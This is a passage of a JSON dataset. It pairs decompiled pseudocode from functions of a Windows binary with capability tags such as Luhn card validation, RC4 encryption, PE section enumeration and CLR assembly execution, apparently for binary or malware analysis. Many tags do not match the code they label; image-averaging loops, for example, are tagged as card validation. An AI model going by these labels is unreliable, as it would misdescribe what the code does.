        "decompiled_code": "\nvoid __cdecl fcn.0048725c(int32_t arg_8h, int32_t *arg_ch)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    code **var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_ch = 0;\n    var_18h = *(in_EAX + 0x160) + 0xc;\n    iVar1 = *(in_EAX + 0x40);\n    var_14h = arg_ch;\n    for (; var_ch < *(in_EAX + 0x38); var_ch = var_ch + 1) {\n        (**var_18h)(*var_14h + arg_8h * *(iVar1 + 0xc) * 4);\n        var_14h = var_14h + 1;\n        var_18h = var_18h + 1;\n        iVar1 = iVar1 + 0x54;\n    }\n    return;\n}\n",
        "token_count": 241
    },
    "004872e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004872e0(uint *arg_8h)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t in_ECX;\n    int32_t iVar5;\n    int32_t in_EDX;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint *var_34h;\n    uchar *var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_EDX + 0x1c) * 8;\n    iVar1 = *(in_EAX + 0xe4) / *(in_EDX + 8);\n    iVar2 = *(in_EAX + 0xe8) / *(in_EDX + 0xc);\n    uVar3 = iVar1 * iVar2;\n    iVar7 = uVar3 >> 1;\n    if (iVar7 < 0) {\n        iVar7 = iVar7 + ((uVar3 & 1) != 0);\n    }\n    fcn.0048720c(uVar6 * iVar1);\n    var_ch = 0;\n    var_34h = arg_8h;\n    for (var_10h = 0; var_10h < *(in_EDX + 0xc); var_10h = var_10h + 1) {\n        var_30h = *var_34h;\n        var_24h = 0;\n        var_28h = 0;\n        if (uVar6 != 0) {\n            do {\n                iVar5 = 0;\n                iVar9 = 0;\n                if (0 < iVar2) {\n                    do {\n                        iVar8 = 0;\n                        puVar4 = *(in_ECX + (var_ch + iVar9) * 4) + var_28h;\n                        if (0 < iVar1) {\n                            do {\n                                iVar5 = iVar5 + *puVar4;\n                                puVar4 = puVar4 + 1;\n                                iVar8 = iVar8 + 1;\n                            } while (iVar8 < iVar1);\n                        }\n                        iVar9 = iVar9 + 1;\n                    } while (iVar9 < iVar2);\n                }\n                *var_30h = (iVar7 + iVar5) / uVar3;\n                var_30h = var_30h + 1;\n                var_24h = var_24h + 1;\n                var_28h = var_28h + iVar1;\n            } while (var_24h < uVar6);\n        }\n        var_ch = var_ch + iVar2;\n        var_34h = var_34h + 1;\n    }\n    return;\n}\n",
        "token_count": 692
    },
    "0048743c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0048743c(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint8_t **in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t in_EDX;\n    uchar *puVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    uint8_t **var_14h;\n    int32_t *var_10h;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar4 = *(in_EDX + 0x1c) * 8;\n    fcn.0048720c(*(in_EDX + 0x1c) << 4);\n    var_10h = arg_8h;\n    var_14h = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        uVar8 = 0;\n        puVar6 = *var_10h;\n        puVar3 = *var_14h;\n        uVar5 = 0;\n        if (uVar4 != 0) {\n            do {\n                puVar1 = puVar3 + 1;\n                uVar8 = uVar8 + 1;\n                uVar2 = *puVar3;\n                puVar3 = puVar3 + 2;\n                iVar7 = uVar2 + *puVar1 + uVar5;\n                uVar5 = uVar5 ^ 1;\n                *puVar6 = iVar7 >> 1;\n                puVar6 = puVar6 + 1;\n            } while (uVar8 < uVar4);\n        }\n        var_14h = var_14h + 1;\n        var_10h = var_10h + 1;\n    }\n    return;\n}\n",
        "token_count": 446
    },
    "004874d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004874d0(int32_t *arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint8_t *puVar2;\n    uint8_t uVar3;\n    uint8_t uVar4;\n    uint8_t *puVar5;\n    uint8_t **in_ECX;\n    uint32_t uVar6;\n    uchar *puVar7;\n    int32_t in_EDX;\n    uint8_t *puVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    uint8_t **var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    uVar6 = *(in_EDX + 0x1c) * 8;\n    fcn.0048720c(*(in_EDX + 0x1c) << 4);\n    var_14h = arg_8h;\n    var_18h = in_ECX;\n    for (var_8h = 0; var_8h < *(in_EDX + 0xc); var_8h = var_8h + 1) {\n        uVar10 = 1;\n        puVar7 = *var_14h;\n        puVar5 = *var_18h;\n        puVar8 = var_18h[1];\n        var_ch = 0;\n        if (uVar6 != 0) {\n            do {\n                puVar1 = puVar5 + 1;\n                uVar3 = *puVar5;\n                puVar5 = puVar5 + 2;\n                uVar4 = *puVar8;\n                puVar2 = puVar8 + 1;\n                puVar8 = puVar8 + 2;\n                iVar9 = uVar3 + *puVar1 + uVar4 + *puVar2 + uVar10;\n                uVar10 = uVar10 ^ 3;\n                *puVar7 = iVar9 >> 2;\n                puVar7 = puVar7 + 1;\n                var_ch = var_ch + 1;\n            } while (var_ch < uVar6);\n        }\n        var_18h = var_18h + 2;\n        var_14h = var_14h + 1;\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "00487fcc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00487fcc(void)\n\n{\n    int32_t *in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = (**in_EAX[1])();\n    in_EAX[0x59] = puVar1;\n    *puVar1 = 0x487b30;\n    if (in_EAX[0x30] == 1) {\n        puVar1[1] = fcn.00487ce8;\n        puVar1[2] = 0x488b1c;\n    }\n    else if (in_EAX[0x30] == 2) {\n        puVar1[1] = fcn.00487e3c;\n        puVar1[7] = 0x488d88;\n    }\n    else {\n        *(*in_EAX + 0x14) = 0x30;\n        (***in_EAX)();\n    }\n    iVar2 = 0;\n    puVar1 = puVar1 + 3;\n    do {\n        iVar2 = iVar2 + 1;\n        *puVar1 = 0;\n        puVar1[5] = 0;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 283
    },
    "00488ad8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00488ad8(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    \n    puVar1 = (***(in_EAX + 4))();\n    iVar3 = 0;\n    *(in_EAX + 0x168) = puVar1;\n    *puVar1 = 0x488048;\n    puVar2 = puVar1 + 0x13;\n    do {\n        iVar3 = iVar3 + 1;\n        *puVar2 = 0;\n        puVar2[4] = 0;\n        puVar2 = puVar2 + 1;\n    } while (iVar3 < 4);\n    puVar1[0x10] = 0;\n    return;\n}\n",
        "token_count": 178
    },
    "00489d10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00489d10(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    int32_t iVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x168) = puVar1;\n    *puVar1 = 0x4890b4;\n    iVar2 = 0;\n    puVar1 = puVar1 + 0xf;\n    do {\n        *puVar1 = 0;\n        puVar1[-4] = 0;\n        puVar1[8] = 0;\n        puVar1[4] = 0;\n        iVar2 = iVar2 + 1;\n        puVar1 = puVar1 + 1;\n    } while (iVar2 < 4);\n    return;\n}\n",
        "token_count": 181
    },
    "0048b31c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048b31c(void)\n\n{\n    ushort *puVar1;\n    int32_t *piVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    ushort *puVar11;\n    uint *in_FS_OFFSET;\n    uint uStack68;\n    uint uStack64;\n    uchar *puStack60;\n    int32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack60 = 0x48b33d;\n    piVar2 = fcn.00423eac();\n    puStack60 = 0x48b342;\n    uVar3 = (**(*piVar2 + 0x2c))();\n    puStack60 = 0x48b359;\n    piVar2 = fcn.00423eac();\n    puStack60 = 0x48b35e;\n    var_28h = (**(*piVar2 + 0x20))();\n    iVar4 = uVar3 >> 1;\n    if (iVar4 < 0) {\n        iVar4 = iVar4 + ((uVar3 & 1) != 0);\n    }\n    uStack64 = 0x48b588;\n    uStack68 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffbc;\n    puStack60 = &stack0xfffffffc;\n    piVar2 = fcn.00426010();\n    piVar5 = fcn.00426010();\n    fcn.00423eac();\n    (**(*piVar2 + 8))();\n    fcn.00423eac();\n    (**(*piVar5 + 8))();\n    (**(*piVar2 + 0x40))();\n    (**(*piVar5 + 0x40))();\n    (**(*piVar2 + 0x34))();\n    (**(*piVar5 + 0x34))();\n    piVar2 = fcn.00426010();\n    (**(*piVar2 + 0x40))();\n    (**(*piVar2 + 0x34))();\n    fcn.00423eac();\n    (**(*piVar2 + 8))();\n    if (-1 < var_28h + -1) {\n        do {\n            iVar6 = fcn.00426754();\n            iVar7 = fcn.00426754();\n            iVar8 = fcn.00426754();\n            if (-1 < uVar3 - 1) {\n                iVar9 = 0;\n                uVar10 = uVar3;\n                do {\n                    if (iVar9 < iVar4) {\n                        puVar1 = iVar7 + iVar9 * 3;\n                        puVar11 = iVar8 + iVar9 * 3;\n                        *puVar1 = *puVar11;\n                        *(puVar1 + 1) = *(puVar11 + 1);\n                    }\n                    else {\n                        puVar1 = iVar6 + (iVar9 - iVar4) * 3;\n                        puVar11 = iVar8 + iVar9 * 3;\n                        *puVar1 = *puVar11;\n                        *(puVar1 + 1) = *(puVar11 + 1);\n                    }\n                    iVar9 = iVar9 + 1;\n                    uVar10 = uVar10 - 1;\n                } while (uVar10 != 0);\n            }\n            var_28h = var_28h + -1;\n        } while (var_28h != 0);\n    }\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    piVar2 = fcn.00423eac();\n    (**(*piVar2 + 8))();\n    *in_FS_OFFSET = uStack68;\n    puStack60 = 0x48b58f;\n    uStack64 = 0x48b577;\n    fcn.00403f58();\n    uStack64 = 0x48b57f;\n    fcn.00403f58();\n    uStack64 = 0x48b587;\n    fcn.00403f58();\n    return;\n}\n",
        "token_count": 1034
    },
    "0048c034": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c034(void)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack32 = &stack0xfffffffc;\n    uStack36 = 0x48c0cd;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack40;\n    iVar3 = 0x17;\n    puVar2 = 0x4927fc;\n    do {\n        fcn.004030dc(0x48c0e4, *puVar2, 0xffffffff);\n        fcn.0040941c();\n        fcn.00405124(0);\n        uVar1 = fcn.00405264();\n        fcn.004030dc(uVar1);\n        uStack40 = fcn.00405264();\n        sub.kernel32.dll_CopyFileA();\n        puVar2 = puVar2 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *in_FS_OFFSET = uStack40;\n    fcn.00404dc4(0x48c0d4);\n    return;\n}\n",
        "token_count": 305
    },
    "0048c768": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0048c768(void)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint *arg_8h;\n    uint arg_8h_00;\n    uint var_158h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    fcn.00405254();\n    arg_8h_00 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffe8c;\n    fcn.00404da0();\n    uVar1 = **0x492bf8;\n    **0x492bf8 = 0;\n    fcn.004033f8();\n    fcn.004038c4();\n    fcn.00402e40();\n    iVar2 = fcn.00402ec0();\n    if (iVar2 == 0) {\n        fcn.004036d4();\n        for (iVar2 = fcn.00402e40(); 0x400 < iVar2; iVar2 = iVar2 - var_ch) {\n            fcn.004054ec();\n            arg_8h = &var_ch;\n            fcn.004052bc();\n            fcn.0040354c(arg_8h);\n            fcn.00402e40();\n            fcn.0040506c();\n        }\n        fcn.004054ec();\n        arg_8h_00 = 0;\n        fcn.004052bc();\n        fcn.0040354c(arg_8h_00);\n        fcn.00402e40();\n        fcn.0040506c();\n        fcn.0040356c();\n        fcn.00402e40();\n    }\n    **0x492bf8 = uVar1;\n    *in_FS_OFFSET = arg_8h_00;\n    fcn.00404dc4();\n    return;\n}\n",
        "token_count": 421
    },
    "0048c8c4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0048c8c4(void)\n\n{\n    uint32_t uVar1;\n    uint var_105h;\n    \n    uVar1 = sub.SHFolder.dll_SHGetFolderPathA(0);\n    if ((uVar1 & 0x80000000) == 0) {\n        fcn.00405010();\n    }\n    else {\n        fcn.00404da0();\n    }\n    return;\n}\n",
        "token_count": 93
    },
    "0041b318": {
        "rules": [
            "delay execution"
        ],
        "decompiled_code": "\nvoid fcn.0041b318(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.kernel32.dll_WaitForSingleObject(*0x4962cc);\n    if (iVar1 == 0) {\n        fcn.0041b30c();\n    }\n    return;\n}\n",
        "token_count": 66
    },
    "004089fc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004089fc(uint param_1, char *param_2)\n\n{\n    char *in_EAX;\n    char *pcVar1;\n    char *pcVar2;\n    char *pcVar3;\n    char *pcVar4;\n    char *pcVar5;\n    bool bVar6;\n    \n    pcVar1 = in_EAX;\n    if (in_EAX != NULL) {\n        pcVar1 = *(in_EAX + -4);\n    }\n    pcVar3 = param_2;\n    if (param_2 != NULL) {\n        pcVar3 = *(param_2 + -4);\n    }\n    pcVar2 = pcVar1;\n    if (pcVar3 < pcVar1) {\n        pcVar2 = pcVar3;\n    }\n    bVar6 = true;\n    do {\n        pcVar4 = in_EAX;\n        pcVar5 = param_2;\n        if (pcVar2 == NULL) break;\n        pcVar2 = pcVar2 + -1;\n        pcVar5 = param_2 + 1;\n        pcVar4 = in_EAX + 1;\n        bVar6 = *in_EAX == *param_2;\n        in_EAX = pcVar4;\n        param_2 = pcVar5;\n    } while (bVar6);\n    if (!bVar6) {\n        pcVar1 = pcVar4[-1];\n        pcVar3 = pcVar5[-1];\n    }\n    return pcVar1 - pcVar3;\n}\n",
        "token_count": 332
    },
    "0040e6e0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e6e0(uint arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    uint uVar1;\n    \n    if (arg_10h == 0x400) {\n        uVar1 = sub.oleaut32.dll_VariantChangeType(arg_8h, arg_ch, arg_14h, arg_18h);\n    }\n    else {\n        uVar1 = 0x80004001;\n    }\n    return uVar1;\n}\n",
        "token_count": 124
    },
    "0041a588": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041a588(uint param_1)\n\n{\n    fcn.00418c50(param_1);\n    fcn.00404e90();\n    fcn.004052bc();\n    fcn.00418c50();\n    return;\n}\n",
        "token_count": 59
    },
    "0041b89c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041b89c(uint param_1, int32_t *param_2)\n\n{\n    uint var_4h;\n    \n    (**(*param_2 + 4))(0x41b65c);\n    (**(*param_2 + 4))(0x41b668);\n    return;\n}\n",
        "token_count": 71
    },
    "00421744": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00421744(int32_t *arg_8h)\n\n{\n    int32_t *in_EAX;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint var_4h;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.00421d68();\n    fcn.00421d68();\n    sub.gdi32.dll_StretchBlt\n              (in_EAX[1], *in_EDX, in_EDX[1], in_EDX[2] - *in_EDX, in_EDX[3] - in_EDX[1], *(in_ECX + 4), *arg_8h, \n               arg_8h[1], arg_8h[2] - *arg_8h, arg_8h[3] - arg_8h[1], in_EAX[8]);\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 214
    },
    "00421cb0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00421cb0(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(in_EAX + 4) != 0) && (*(in_EAX + 8) != (~*0x421d0c & *(in_EAX + 8)))) {\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x49635c);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x496360);\n        sub.gdi32.dll_SelectObject(*(in_EAX + 4), *0x496364);\n        *(in_EAX + 8) = ~*0x421d0c & *(in_EAX + 8);\n    }\n    return;\n}\n",
        "token_count": 164
    },
    "00421e34": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00421e34(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = fcn.0042121c();\n    sub.gdi32.dll_SelectObject(*(in_EAX + 4), uVar1);\n    sub.gdi32.dll_SetROP2(*(in_EAX + 4), *(*(*(in_EAX + 0x10) + 0x18) * 2 + 0x490dcc));\n    return;\n}\n",
        "token_count": 108
    },
    "004224cc": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.004224cc(void)\n\n{\n    uchar *puVar1;\n    uchar *puVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    \n    iVar3 = 0xff;\n    do {\n        puVar1 = in_EAX + iVar3 * 4;\n        puVar2 = in_EAX + iVar3 * 3;\n        puVar1[2] = puVar2[2];\n        puVar1[1] = puVar2[1];\n        *puVar1 = *puVar2;\n        puVar1[3] = 0;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    *(in_EAX + 3) = 0;\n    return;\n}\n",
        "token_count": 169
    },
    "0043e154": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0043e154(uint arg_8h)\n\n{\n    int32_t *in_EAX;\n    \n    if (*0x43e18c == (*0x43e188 & *(in_EAX + 7))) {\n        (**(*in_EAX + 0x30))();\n    }\n    return;\n}\n",
        "token_count": 73
    },
    "00441e90": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00441e90(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uint var_4h;\n    \n    *(*0x4915dc + 0x1b4) = arg_8h;\n    iVar1 = sub.user32.dll_IsWindowUnicode(arg_8h);\n    if (iVar1 == 0) {\n        sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffffc, *(*0x4915dc + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongA(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongA(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    else {\n        sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffffc, *(*0x4915dc + 0x1c0));\n        uVar2 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff0);\n        if ((uVar2 & 0x40000000) != 0) {\n            iVar1 = sub.user32.dll_GetWindowLongW(arg_8h, 0xfffffff4);\n            if (iVar1 == 0) {\n                sub.user32.dll_SetWindowLongW(arg_8h, 0xfffffff4, arg_8h);\n            }\n        }\n    }\n    sub.user32.dll_SetPropA(arg_8h, *0x496506, *0x4915dc);\n    sub.user32.dll_SetPropA(arg_8h, *0x496504, *0x4915dc);\n    iVar1 = *0x4915dc;\n    *0x4915dc = 0;\n    uVar3 = (**(iVar1 + 0x1c0))(arg_8h, arg_ch, arg_10h, arg_14h);\n    return uVar3;\n}\n",
        "token_count": 509
    },
    "0044c65c": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.0044c65c(void)\n\n{\n    int32_t in_EAX;\n    \n    sub.user32.dll_SetWindowPos(*(in_EAX + 0x1b4), 0, 0, 0, 0, 0, *(*(in_EAX + 0x1da) * 2 + 0x4916a0));\n    return;\n}\n",
        "token_count": 85
    },
    "00453da0": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453da0(uint32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    fcn.00453dc8(arg_8h & 0xff, *(in_EAX + 0x43), *(in_EAX + 0x40), arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 88
    },
    "00453dc8": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00453dc8(uint arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    \n    cVar1 = fcn.00453390();\n    if (cVar1 != '\\0') {\n        (**(*in_EAX + 0x30))(arg_8h, *((arg_10h & 0xff) * 4 + 0x491714) | *((arg_ch & 0xff) * 4 + 0x491724), arg_18h);\n    }\n    return;\n}\n",
        "token_count": 150
    },
    "0046e438": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046e438(uint param_1, uchar param_2)\n\n{\n    uchar *puVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStackY48;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    uStack28 = 0x46e4c5;\n    uStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack32;\n    puVar1 = &stack0xfffffffc;\n    if ((*(in_EAX + 0x1c) & 2) == 0) {\n        if (*(in_EAX + 0x254) == 0) {\n            fcn.00406a50();\n            fcn.0040c5ac();\n            fcn.004047cc();\n            puVar1 = puStack24;\n        }\n        else {\n            puStack24 = &stack0xfffffffc;\n            uVar2 = fcn.0046e140(param_2);\n            uStackY48 = fcn.0044d1c8(0x1333, uVar2);\n            sub.user32.dll_SendMessageA();\n            puVar1 = puStack24;\n        }\n    }\n    puStack24 = puVar1;\n    *(in_EAX + 0x25a) = param_2;\n    *in_FS_OFFSET = uStackY48;\n    fcn.00404da0(0x46e4cc);\n    return;\n}\n",
        "token_count": 353
    },
    "00470e70": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00470e70(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if (param_2 != 0) {\n        if (param_2 != in_EAX[0x69]) {\n            fcn.0041b5e0();\n        }\n        fcn.0043c3ac();\n        fcn.0044470c();\n        fcn.004455dc();\n        fcn.00470cd0();\n        (**(*in_EAX + 0x68))();\n        fcn.00404df4();\n        fcn.00470d68();\n        fcn.004454cc();\n    }\n    in_EAX[0x69] = param_2;\n    return;\n}\n",
        "token_count": 169
    },
    "00472c98": {
        "rules": [
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nvoid fcn.00472c98(void)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    \n    if ((*0x472ce0 != (*(in_EAX + 0x1c) & *0x472cdc)) && (cVar1 = fcn.0044d568(),  cVar1 == '\\0')) {\n        return;\n    }\n    fcn.00471758();\n    fcn.00472eb8();\n    return;\n}\n",
        "token_count": 103
    },
    "004033f8": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nuint fcn.004033f8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    \n    fcn.00403720();\n    *(in_EAX + 0x14) = in_EAX + 0x14c;\n    *(in_EAX + 4) = 0xd7b0;\n    *(in_EAX + 6) = *0x490030;\n    *(in_EAX + 8) = 0x80;\n    *(in_EAX + 0x18) = 0x40324c;\n    uVar1 = fcn.00405060();\n    fcn.00405264(uVar1);\n    fcn.00402ee0();\n    iVar2 = fcn.00405060();\n    *(in_EAX + 0x48 + iVar2) = 0;\n    return 0;\n}\n",
        "token_count": 198
    },
    "00404bf0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Unable to track spacebase fully for stack\n\nbool fcn.00404bf0(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    iVar1 = *0x490000;\n    *0x490000 = 0;\n    puVar3 = *0x4957c4;\n    puVar4 = 0x4957c4;\n    for (iVar2 = 0xb; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    return iVar1 == 0;\n}\n",
        "token_count": 171
    },
    "0041c4b0": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041c4b0(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uint *in_FS_OFFSET;\n    ulong uVar1;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41c513;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack28;\n    if (arg_ch != 0) {\n        *(arg_ch + 4) = 2;\n        uVar1 = (****(arg_8h + 0xc))();\n        *(arg_ch + 8) = uVar1;\n        *(arg_ch + 0xc) = uVar1 >> 0x20;\n        *(arg_ch + 0x10) = 0;\n        *(arg_ch + 0x14) = 0;\n        *(arg_ch + 0x18) = 0;\n        *(arg_ch + 0x1c) = 0;\n        *(arg_ch + 0x20) = 0;\n        *(arg_ch + 0x24) = 0;\n        *(arg_ch + 0x2c) = 1;\n    }\n    *in_FS_OFFSET = uStack28;\n    return 0;\n}\n",
        "token_count": 295
    },
    "00423e48": {
        "rules": [
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
